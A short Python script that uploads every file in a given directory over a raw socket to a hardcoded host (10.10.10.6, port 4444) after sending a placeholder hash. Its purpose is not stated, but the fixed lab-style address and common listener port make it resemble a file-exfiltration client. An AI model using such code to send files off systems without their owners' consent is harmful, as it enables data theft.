import socket, os, tqdm,sys

SEPARATOR="<SEPARATOR>"
BUFFER_SIZE=4096
try:
    directory = sys.argv[1]
except IndexError:
    print("You must specify files to transfer")
    exit()
os.chdir(directory)
s = socket.socket()
host = "10.10.10.6"
port = 4444
print(f"[+] Connecting to {host}:{port}")
s.connect((host, port))
USER_HASH="ALPHA_VERSION_PLACEBO_HASH"
s.send(f"{USER_HASH}".encode())
s.recv(BUFFER_SIZE)
print("[+] Connected to", host)
for relFilename in os.listdir(directory):
    try:
        filename=os.path.abspath(relFilename)
        filesize = os.path.getsize(filename)
        s.send(f"{filename}{SEPARATOR}{filesize}".encode())
        print(f"sending {filename}")
        with open(filename, "rb") as f:
            while True:
                bytes_read = f.read(BUFFER_SIZE)
                if not bytes_read:
                    break
                s.sendall(bytes_read)
        s.send("<FILEBREAK>".encode())
        s.recv(BUFFER_SIZE)
    except PermissionError:
        pass
s.send(b"<FILETRANSFERCOMPLETE>")
s.recv(BUFFER_SIZE)
s.send(b"<FILETRANSFERCOMPLETE>")
s.close()
print("file transfer complete")
input()


